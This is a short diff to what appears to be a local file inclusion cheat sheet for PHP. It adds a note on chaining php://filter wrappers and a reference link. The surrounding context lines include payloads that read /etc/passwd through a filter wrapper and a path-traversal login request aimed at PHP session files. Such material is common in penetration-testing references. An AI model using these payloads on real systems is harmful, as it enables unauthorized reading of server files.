@@ -151,6 +151,8 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
+NOTE: Wrappers can be chained : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+
 ### Wrapper zip://
 
 ```python
@@ -338,3 +340,4 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 * [Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)
 * [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
+* [Local file inclusion mini list - Penetrate.io](https://penetrate.io/2014/09/25/local-file-inclusion-mini-list/)
